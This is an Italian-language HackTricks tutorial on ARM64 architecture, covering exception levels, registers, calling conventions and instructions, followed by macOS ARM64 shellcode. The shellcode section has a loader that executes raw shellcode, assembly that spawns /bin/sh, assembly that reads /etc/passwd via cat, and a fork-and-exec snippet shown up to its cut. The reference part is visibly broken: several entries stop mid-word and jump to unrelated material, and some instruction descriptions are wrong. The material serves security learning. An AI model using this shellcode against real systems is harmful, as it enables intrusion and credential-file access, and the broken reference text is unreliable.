# Introduzione ad ARM64v8

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## **Livelli di eccezione - EL (ARM64v8)**

Nell'architettura ARMv8, i livelli di esecuzione, noti come livelli di eccezione (EL), definiscono il livello di privilegio e le capacità dell'ambiente di esecuzione. Ci sono quattro livelli di eccezione, che vanno da EL0 a EL3, ognuno con uno scopo diverso:

1. **EL0 - Modalità utente**:
* Questo è il livello con il minor numero di privilegi ed è utilizzato per l'esecuzione del codice dell'applicazione regolare.
* Le applicazioni in esecuzione a EL0 sono isolate l'una dall'altra e dal software di sistema, migliorando la sicurezza e la stabilità.
2. **EL1 - Modalità kernel del sistema operativo**:
* La maggior parte dei kernel dei sistemi operativi viene eseguita a questo livello.
* EL1 ha più privilegi rispetto a EL0 e può accedere alle risorse di sistema, ma con alcune restrizioni per garantire l'integrità del sistema.
3. **EL2 - Modalità hypervisor**:
* Questo livello viene utilizzato per la virtualizzazione. Un hypervisor in esecuzione a EL2 può gestire più sistemi operativi (ciascuno nel proprio EL1) in esecuzione sull'hardware fisico.
* EL2 fornisce funzionalità per l'isolamento e il controllo degli ambienti virtualizzati.
4. **EL3 - Modalità monitor sicuro**:
* Questo è il livello con il maggior numero di privilegi ed è spesso utilizzato per l'avvio sicuro e gli ambienti di esecuzione affidabili.
* EL3 può gestire e controllare gli accessi tra stati sicuri e non sicuri (come l'avvio sicuro, il sistema operativo affidabile, ecc.).

L'uso di questi livelli consente di gestire in modo strutturato e sicuro diversi aspetti del sistema, dalle applicazioni utente al software di sistema con i privilegi più elevati. L'approccio di ARMv8 ai livelli di privilegio aiuta a isolare efficacemente diversi componenti di sistema, migliorando così la sicurezza e la robustezza del sistema.

## **Registri (ARM64v8)**

ARM64 ha **31 registri generici**, etichettati da `x0` a `x30`. Ciascuno può memorizzare un valore di **64 bit** (8 byte). Per le operazioni che richiedono solo valori a 32 bit, gli stessi registri possono essere accessibili in modalità a 32 bit utilizzando i nomi w0 a w30.

1. **`x0`** a **`x7`** - Questi sono tipicamente utilizzati come registri temporanei e per passare parametri alle subroutine.
* **`x0`** contiene anche i dati di ritorno di una funzione.
2. **`x8`** - Nel kernel Linux, `x8` viene utilizzato come numero di chiamata di sistema per l'istruzione `svc`. **In macOS viene utilizzato x16!**
3. **`x9`** a **`x15`** - Altri registri temporanei, spesso utilizzati per variabili locali.
4. **`x16`** e **`x17`** - **Registri di chiamata intra-procedurali**. Registri temporanei per valori immediati. Vengono utilizzati anche per chiamate di funzioni indirette e stub della PLT (Procedure Linkage Table).
* **`x16`** viene utilizzato come **numero di chiamata di sistema** per l'istruzione **`svc`** in **macOS**.
5. **`x18`** - **Registro di piattaforma**. Può essere utilizzato come registro generico, ma su alcune piattaforme, questo registro è riservato per usi specifici della piattaforma: puntatore al blocco dell'ambiente del thread corrente in Windows, o per puntare alla struttura del task attualmente in esecuzione nel kernel Linux.
6. **`x19`** a **`x28`** - Questi sono registri salvati dal chiamato. Una funzione deve preservare i valori di questi registri per il chiamante, quindi vengono memorizzati nello stack e ripristinati prima di tornare al chiamante.
7. **`x29`** - **Puntatore al frame** per tenere traccia del frame dello stack. Quando viene creato un nuovo frame dello stack perché viene chiamata una funzione, il registro **`x29`** viene **memorizzato nello stack** e l'indirizzo del nuovo frame (**indirizzo di `sp`**) viene **memorizzato in questo registro**.
* Questo registro può anche essere utilizzato come **registro generico**, anche se di solito viene utilizzato come riferimento alle **variabili locali**.
8. **`x30`** o **`lr`** - **Registro di collegamento**. Contiene l'indirizzo di ritorno quando viene eseguita un'istruzione `BL` (Branch with Link) o `BLR` (Branch with Link to Register) memorizzando il valore di **`pc`** in questo registro.
* Può anche essere utilizzato come qualsiasi altro registro.
9. **`sp`** - **Puntatore dello stack**, utilizzato per tenere traccia della cima dello stack.
* il valore di **`sp`** deve sempre essere mantenuto allineato su almeno una **quadword** o potrebbe verificarsi un'eccezione di allineamento.
10. **`pc`** - **Contatore di programma**, che punta all'istruzione successiva. Questo registro può essere aggiornato solo tramite generazioni di eccezioni, ritorni di eccezioni e salti. Le uniche istruzioni ordinarie che possono leggere questo registro sono le istruzioni di salto con collegamento (BL, BLR) per memorizzare l'indirizzo di **`pc`** in **`lr`** (Registro di collegamento).
11. **`xzr`** - **Registro zero**. Chiamato anche **`wzr`** nella sua forma di registro a **32** bit. Può essere utilizzato per ottenere facilmente il valore zero (operazione comune) o per eseguire confronti utilizzando **`subs`** come **`subs XZR, Xn, #10`** memorizzando i dati risultanti da nessuna parte (in **`xzr`**).

I registri **`Wn`** sono la versione a **32 bit** del registro **`Xn`**.

### Registri SIMD e Floating-Point

Inoltre, ci sono altri **32 registri di lunghezza 128 bit** che possono essere utilizzati in operazioni SIMD ottimizzate con istruzioni singole su dati multipli e per eseguire operazioni aritmetiche in virgola mobile. Questi sono chiamati registri Vn, anche se possono operare anche a **64** bit, **32** bit, **16** bit e **8** bit e quindi vengono chiamati **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** e **`Bn`
### **PSTATE**

**PSTATE** contiene diversi componenti del processo serializzati nel registro speciale **`SPSR_ELx`** visibile dal sistema operativo, dove X rappresenta il **livello di permesso dell'eccezione scatenata** (questo consente di ripristinare lo stato del processo quando l'eccezione termina).\
Questi sono i campi accessibili:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* I flag di condizione **`N`**, **`Z`**, **`C`** e **`V`**:
* **`N`** indica che l'operazione ha prodotto un risultato negativo
* **`Z`** indica che l'operazione ha prodotto zero
* **`C`** indica che l'operazione ha generato un carry
* **`V`** indica che l'operazione ha prodotto un overflow con segno:
* La somma di due numeri positivi produce un risultato negativo.
* La somma di due numeri negativi produce un risultato positivo.
* Nella sottrazione, quando un numero negativo grande viene sottratto da un numero positivo più piccolo (o viceversa), e il risultato non può essere rappresentato nell'intervallo della dimensione dei bit fornita.

{% hint style="warning" %}
Non tutte le istruzioni aggiornano questi flag. Alcune come **`CMP`** o **`TST`** lo fanno, e altre che hanno un suffisso s come **`ADDS`** lo fanno anche.
{% endhint %}

* Il flag di **larghezza del registro corrente (`nRW`)**: Se il flag ha il valore 0, il programma verrà eseguito nello stato di esecuzione AArch64 una volta ripreso.
* Il **livello di eccezione corrente** (**`EL`**): Un programma normale in esecuzione in EL0 avrà il valore 0.
* Il flag di **single stepping** (**`SS`**): Utilizzato dai debugger per eseguire il single step impostando il flag SS a 1 all'interno di **`SPSR_ELx`** tramite un'eccezione. Il programma eseguirà un passo e genererà un'eccezione di single step.
* Il flag di stato di **eccezione illegale** (**`IL`**): Viene utilizzato per segnalare quando un software privilegiato esegue un trasferimento di livello di eccezione non valido, questo flag viene impostato su 1 e il processore genera un'eccezione di stato illegale.
* I flag **`DAIF`**: Questi flag consentono a un programma privilegiato di mascherare selettivamente determinate eccezioni esterne.
* Se **`A`** è 1, significa che verranno scatenati **aborti asincroni**. **`I`** configura la risposta alle **richieste di interruzioni hardware esterne** (IRQ) e F è correlato alle **richieste di interruzioni rapide** (FIR).
* I flag di selezione del **puntatore dello stack** (**`SPS`**): I programmi privilegiati in esecuzione in EL1 e superiori possono scambiare tra l'uso del proprio registro del puntatore dello stack e quello del modello utente (ad esempio tra `SP_EL1` e `EL0`). Questo scambio viene eseguito scrivendo nel registro speciale **`SPSel`**. Ciò non può essere fatto da EL0.

## **Convenzione di chiamata (ARM64v8)**

La convenzione di chiamata ARM64 specifica che i **primi otto parametri** di una funzione vengono passati nei registri **`x0`** attraverso **`x7`**. I parametri **aggiuntivi** vengono passati nello **stack**. Il valore di **ritorno** viene passato nel registro **`x0`**, o anche in **`x1`** se è lungo 128 bit. I registri **`x19`** a **`x30`** e **`sp`** devono essere **preservati** durante le chiamate alle funzioni.

Quando si legge una funzione in assembly, cercare il **prologo e l'epilogo** della funzione. Il **prologo** di solito coinvolge il **salvataggio del frame pointer (`x29`)**, la **configurazione** di un **nuovo frame pointer** e l'**allocazione dello spazio dello stack**. L'**epilogo** di solito coinvolge il **ripristino del frame pointer salvato** e il **ritorno** dalla funzione.

### Convenzione di chiamata in Swift

Swift ha la sua **convenzione di chiamata** che può essere trovata in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Istruzioni comuni (ARM64v8)**

Le istruzioni ARM64 hanno generalmente il formato `opcode dst, src1, src2`, dove `opcode` è l'**operazione** da eseguire (come `add`, `sub`, `mov`, ecc.), `dst` è il registro di **destinazione** in cui verrà memorizzato il risultato e `src1` e `src2` sono i registri di **origine**. Possono essere utilizzati anche valori immediati al posto dei registri di origine.

* **`mov`**: **Sposta** un valore da un **registro** a un altro.
* Esempio: `mov x0, x1` — Questo sposta il valore da `x1` a `x0`.
* **`ldr`**: **Carica** un valore dalla **memoria** in un **registro**.
* Esempio: `ldr x0, [x1]` — Questo carica un valore dalla posizione di memoria puntata da `x1` in `x0`.
* **`str`**: **Memorizza** un valore da un **registro** nella **memoria**.
* Esempio: `str x0, [x1]` — Questo memorizza il valore in `x0` nella posizione di memoria puntata da `x1`.
* **`ldp`**: **Carica una coppia di registri**. Questa istruzione **carica due registri** da **posizioni di memoria consecutive**. L'indirizzo di memoria è tipicamente formato dall'aggiunta di un offset al valore di un altro registro.
* Esempio: `ldp x0, x1, [x2]` — Questo carica `x0` e `x1` dalle posizioni di memoria in `x2` e `x2 + 8`, rispettivamente.
* **`stp`**: **Memorizza una coppia di registri**. Questa istruzione **memorizza due registri** in **posizioni di memoria consecutive**. L'indirizzo di memoria è tipicamente formato dall'aggiunta di un offset al valore di un altro registro.
* Esempio: `stp x0, x1, [x2]` — Questo memorizza `x0` e `x1` nelle posizioni di memoria in `x2` e `x2 + 8`, rispettivamente.
* **`add`**: **Somma** i valori di due registri e memorizza il risultato in un registro.
* Sintassi: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> Destinazione
* Xn2 -> Operando 1
* Xn3 | #imm -> Operando 2 (registro o immediato)
* \[shift #N | RRX] -> Esegue uno shift o chiama RRX
* Esempio: `add x0, x1, x2` — Questo somma i valori in `x1` e `x2` e memorizza il risultato in `x0`.
* `add x5, x5, #1, lsl #12` — Questo equivale a 4096 (un 1 spostato 12 volte) -> 1 0000 0000 0000 0000 &#x20;
* **`adds`** Esegue un'operazione di `add` e aggiorna i flag
* **`sub`**: **Sottra
* **`bfm`**: **Bit Filed Move**, queste operazioni **copiano i bit `0...n`** da un valore e li posizionano nelle posizioni **`m..m+n`**. Il **`#s`** specifica la posizione del bit più a sinistra e **`#r`** la quantità di rotazione a destra.
* Bitfiled move: `BFM Xd, Xn, #r`
* Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
* Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
* **Bitfield Extract and Insert:** Copia un bitfield da un registro e lo copia in un altro registro.
* **`BFI X1, X2, #3, #4`** Inserisce 4 bit da X2 dal 3° bit di X1
* **`BFXIL X1, X2, #3, #4`** Estrae dal 3° bit di X2 quattro bit e li copia in X1
* **`SBFIZ X1, X2, #3, #4`** Estende il segno di 4 bit da X2 e li inserisce in X1 a partire dalla posizione del bit 3 azzerando i bit a destra
* **`SBFX X1, X2, #3, #4`** Estrae 4 bit a partire dal bit 3 di X2, estende il segno e inserisce il risultato in X1
* **`UBFIZ X1, X2, #3, #4`** Estende con zeri 4 bit da X2 e li inserisce in X1 a partire dalla posizione del bit 3 azzerando i bit a destra
* **`UBFX X1, X2, #3, #4`** Estrae 4 bit a partire dal bit 3 di X2 e inserisce il risultato esteso con zeri in X1.
* **Estendi il segno a X:** Estende il segno (o aggiunge solo 0 nella versione non firmata) di un valore per poter eseguire operazioni con esso:
* **`SXTB X1, W2`** Estende il segno di un byte **da W2 a X1** (`W2` è la metà di `X2`) per riempire i 64 bit
* **`SXTH X1, W2`** Estende il segno di un numero a 16 bit **da W2 a X1** per riempire i 64 bit
* **`SXTW X1, W2`** Estende il segno di un byte **da W2 a X1** per riempire i 64 bit
* **`UXTB X1, W2`** Aggiunge zeri (non firmato) a un byte **da W2 a X1** per riempire i 64 bit
* **`extr`:** Estrae i bit da una coppia specificata di registri concatenati.
* Esempio: `EXTR W3, W2, W1, #3` Questo concatena W1+W2 e prende dal bit 3 di W2 fino al bit 3 di W1 e lo memorizza in W3.
* **`bl`**: **Branch** con link, utilizzato per **chiamare** una **sotto-routine**. Memorizza l'indirizzo di ritorno in `x30`.
* Esempio: `bl myFunction` — Questo chiama la funzione `myFunction` e memorizza l'indirizzo di ritorno in `x30`.
* **`blr`**: **Branch** con Link a Registro, utilizzato per **chiamare** una **sotto-routine** in cui il target è **specificato** in un **registro**. Memorizza l'indirizzo di ritorno in `x30`.
* Esempio: `blr x1` — Questo chiama la funzione il cui indirizzo è contenuto in `x1` e memorizza l'indirizzo di ritorno in `x30`.
* **`ret`**: **Ritorna** dalla **sotto-routine**, tipicamente utilizzando l'indirizzo in **`x30`**.
* Esempio: `ret` — Questo ritorna dalla sotto-routine corrente utilizzando l'indirizzo di ritorno in `x30`.
* **`cmp`**: **Confronta** due registri e imposta i flag di condizione. È un **alias di `subs`** impostando il registro di destinazione al registro zero. Utile per sapere se `m == n`.
* Supporta la **stessa sintassi di `subs`**
* Esempio: `cmp x0, x1` — Questo confronta i valori in `x0` e `x1` e imposta i flag di condizione di conseguenza.
* **`cmn`**: **Confronta l'operando negativo**. In questo caso è un **alias di `adds`** e supporta la stessa sintassi. Utile per sapere se `m == -n`.
* **tst**: Controlla se uno dei valori di un registro è 1 (funziona come un ANDS senza memorizzare il risultato da nessuna parte)
* Esempio: `tst X1, #7` Controlla se uno dei 3 bit meno significativi di X1 è 1
* **`b.eq`**: **Branch se uguale**, basato sull'istruzione `cmp` precedente.
* Esempio: `b.eq label` — Se l'istruzione `cmp` precedente ha trovato due valori uguali, salta a `label`.
* **`b.ne`**: **Branch se diverso**. Questa istruzione controlla i flag di condizione (che sono stati impostati da un'istruzione di confronto precedente) e se i valori confrontati non erano uguali, salta a una label o a un indirizzo.
* Esempio: Dopo un'istruzione `cmp x0, x1`, `b.ne label` — Se i valori in `x0` e `x1` non erano uguali, salta a `label`.
* **`cbz`**: **Confronta e salta se zero**. Questa istruzione confronta un registro con zero e se sono uguali, salta a una label o a un indirizzo.
* Esempio: `cbz x0, label` — Se il valore in `x0` è zero, salta a `label`.
* **`cbnz`**: **Confronta e salta se non zero**. Questa istruzione confronta un registro con zero e se non sono uguali, salta a una label o a un indirizzo.
* Esempio: `cbnz x0, label` — Se il valore in `x0` non è zero, salta a `label`.
* **`adrp`**: Calcola l'**indirizzo di pagina di un simbolo** e lo memorizza in un registro.
* Esempio: `adrp x0, symbol` — Questo calcola l'indirizzo di pagina di `symbol` e lo memorizza in `x0`.
* **`ldrsw`**: **Carica** un valore firmato a **32 bit** dalla memoria e lo estende con il segno a 64 bit.
* Esempio: `ldrsw x0, [x1]` — Questo carica un valore firmato a 32 bit dalla posizione di memoria puntata da `x1`, lo estende con il segno a 64 bit e lo memorizza in `x0`.
* **`stur`**: **Memorizza un valore di registro in una posizione di memoria**, utilizzando un offset da un altro registro.
* Esempio: `stur x0, [x1, #4]` — Questo memorizza il valore in `x0` nella posizione di memoria che è 4 byte più grande dell'indirizzo attualmente in `x1`.
* **`svc`** : Esegue una **chiamata di sistema**. Sta per "Supervisor Call". Quando il processore esegue questa istruzione, passa dalla modalità utente alla modalità kernel e salta a una posizione specifica in memoria dove si trova il codice di gestione delle chiamate di sistema del kernel.
*   Esempio:

```armasm
mov x8, 93  ; Carica il numero di chiamata di sistema per l'uscita (93) nel registro x8.
mov x0, 0   ; Carica il codice di stato di uscita (0) nel registro x0.
svc 0       ; Esegue la chiamata di sistema.
```
### **Prologo della Funzione**

1. **Salva il registro del link e il puntatore del frame nello stack**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; salva la coppia x29 e x30 nello stack e decrementa il puntatore dello stack
```
{% endcode %}
2. **Imposta il nuovo puntatore del frame**: `mov x29, sp` (imposta il nuovo puntatore del frame per la funzione corrente)
3. **Alloca spazio nello stack per le variabili locali** (se necessario): `sub sp, sp, <size>` (dove `<size>` è il numero di byte necessari)

### **Epilogo della Funzione**

1. **Dealloca le variabili locali (se ne sono state allocate)**: `add sp, sp, <size>`
2. **Ripristina il registro del link e il puntatore del frame**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Ritorno**: `ret` (restituisce il controllo al chiamante utilizzando l'indirizzo nel registro di collegamento)

## Stato di esecuzione AARCH32

Armv8-A supporta l'esecuzione di programmi a 32 bit. **AArch32** può essere eseguito in uno dei **due set di istruzioni**: **`A32`** e **`T32`** e può passare da uno all'altro tramite **`interworking`**.\
I programmi **privilegiati** a 64 bit possono pianificare l'**esecuzione di programmi a 32 bit** eseguendo un trasferimento di livello di eccezione al livello inferiore privilegiato a 32 bit.\
Si noti che la transizione da 64 bit a 32 bit avviene con un abbassamento del livello di eccezione (ad esempio, un programma a 64 bit in EL1 che attiva un programma in EL0). Ciò viene fatto impostando il **bit 4 del** registro speciale **`SPSR_ELx`** **a 1** quando il thread del processo `AArch32` è pronto per essere eseguito e il resto di `SPSR_ELx` memorizza il CPSR dei programmi **`AArch32`**. Successivamente, il processo privilegiato chiama l'istruzione **`ERET`** in modo che il processore passi a **`AArch32`** entrando in A32 o T32 a seconda di CPSR**.**

L'**`interworking`** avviene utilizzando i bit J e T di CPSR. `J=0` e `T=0` significa **`A32`** e `J=0` e `T=1` significa **T32**. Questo si traduce fondamentalmente nell'impostazione del **bit più basso a 1** per indicare che l'insieme di istruzioni è T32.\
Ciò viene impostato durante le **istruzioni di branch interworking**, ma può anche essere impostato direttamente con altre istruzioni quando il PC viene impostato come registro di destinazione. Esempio:

Un altro esempio:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registri

Ci sono 16 registri da 32 bit (r0-r15). Da r0 a r14 possono essere utilizzati per qualsiasi operazione, tuttavia alcuni di essi sono di solito riservati:

- **`r15`**: Contatore del programma (sempre). Contiene l'indirizzo dell'istruzione successiva. In A32 corrente + 8, in T32 corrente + 4.
- **`r11`**: Puntatore al frame
- **`r12`**: Registro di chiamata intra-procedurale
- **`r13`**: Puntatore allo stack
- **`r14`**: Registro di collegamento

Inoltre, i registri vengono salvati in **registri bancati**. Questi sono luoghi che memorizzano i valori dei registri consentendo di eseguire **cambi di contesto rapidi** nella gestione delle eccezioni e nelle operazioni privilegiate per evitare la necessità di salvare e ripristinare manualmente i registri ogni volta.\
Ciò viene fatto **salvando lo stato del processore dal `CPSR` al `SPSR`** della modalità del processore a cui viene eseguita l'eccezione. Al ritorno dell'eccezione, il **`CPSR`** viene ripristinato dal **`SPSR`**.

### CPSR - Current Program Status Register

In AArch32 il CPSR funziona in modo simile a **`PSTATE`** in AArch64 ed è anche memorizzato in **`SPSR_ELx`** quando viene eseguita un'eccezione per ripristinare successivamente l'esecuzione:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

I campi sono divisi in alcuni gruppi:

- Application Program Status Register (APSR): Flag aritmetici e accessibili da EL0
- Execution State Registers: Comportamento del processo (gestito dal sistema operativo).

#### Application Program Status Register (APSR)

- I flag **`N`**, **`Z`**, **`C`**, **`V`** (come in AArch64)
- Il flag **`Q`**: Viene impostato a 1 ogni volta che si verifica una **saturazione intera** durante l'esecuzione di un'istruzione aritmetica di saturazione specializzata. Una volta impostato a **`1`**, manterrà il valore fino a quando non verrà impostato manualmente a 0. Inoltre, non esiste alcuna istruzione che ne controlli il valore implicitamente, deve essere letto manualmente.
- I flag **`GE`** (Greater than or equal): Vengono utilizzati nelle operazioni SIMD (Single Instruction, Multiple Data), come "addizione parallela" e "sottrazione parallela". Queste operazioni consentono di elaborare più punti di dati in un'unica istruzione.

Ad esempio, l'istruzione **`UADD8`** **aggiunge quattro coppie di byte** (da due operandi a 32 bit) in parallelo e memorizza i risultati in un registro a 32 bit. Quindi **imposta i flag `GE` nell'`APSR`** in base a questi risultati. Ogni flag GE corrisponde a una delle addizioni di byte, indicando se l'addizione per quella coppia di byte ha **superato il limite**.

L'istruzione **`SEL`** utilizza questi flag GE per eseguire azioni condizionali.

#### Execution State Registers

- I bit **`J`** e **`T`**: **`J`** dovrebbe essere 0 e se **`T`** è 0 viene utilizzato il set di istruzioni A32, se è 1 viene utilizzato il set di istruzioni T32.
- Registro di stato del blocco IT (`ITSTATE`): Sono i bit da 10-15 e 25-26. Memorizzano le condizioni per le istruzioni all'interno di un gruppo con prefisso **`IT`**.
- Bit **`E`**: Indica la **endianness**.
- Bit **Mode and Exception Mask Bits** (0-4): Determinano lo stato di esecuzione corrente. Il quinto indica se il programma viene eseguito come 32 bit (1) o 64 bit (0). Gli altri 4 rappresentano la **modalità di eccezione attualmente in uso** (quando si verifica un'eccezione e viene gestita). Il numero impostato **indica la priorità corrente** nel caso in cui venga innescata un'altra eccezione durante la gestione di questa.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Alcune eccezioni possono essere disabilitate utilizzando i bit **`A`**, `I`, `F`. Se **`A`** è 1, significa che verranno innescate interruzioni asincrone. **`I`** configura la risposta alle richieste di interruzioni hardware esterne (IRQ) e F è correlato alle richieste di interruzione veloce (FIR).

## macOS

### BSD syscalls

Controlla [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Le syscalls BSD avranno **x16 > 0**.

### Mach Traps

Controlla [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). Le Mach traps avranno **x16 < 0**, quindi è necessario chiamare i numeri dalla lista precedente con un **meno**: **`_kernelrpc_mach_vm_allocate_trap`** è **`-10`**.

Puoi anche controllare **`libsystem_kernel.dylib`** in un disassemblatore per scoprire come chiamare queste syscalls (e BSD):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
A volte è più facile controllare il codice **decompilato** da **`libsystem_kernel.dylib`** che controllare il **codice sorgente** perché il codice di diverse syscalls (BSD e Mach) viene generato tramite script (controlla i commenti nel codice sorgente), mentre nella dylib puoi trovare cosa viene chiamato.
{% endhint %}

### Shellcodes

Per compilare:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Per estrarre i byte:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Codice C per testare lo shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preso da [**qui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e spiegato.

{% tabs %}
{% tab title="con adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="con stack" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Leggere con cat

L'obiettivo è eseguire `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, quindi il secondo argomento (x1) è un array di parametri (che in memoria significa uno stack di indirizzi).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Esegui un comando con sh da una fork in modo che il processo principale non venga terminato
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
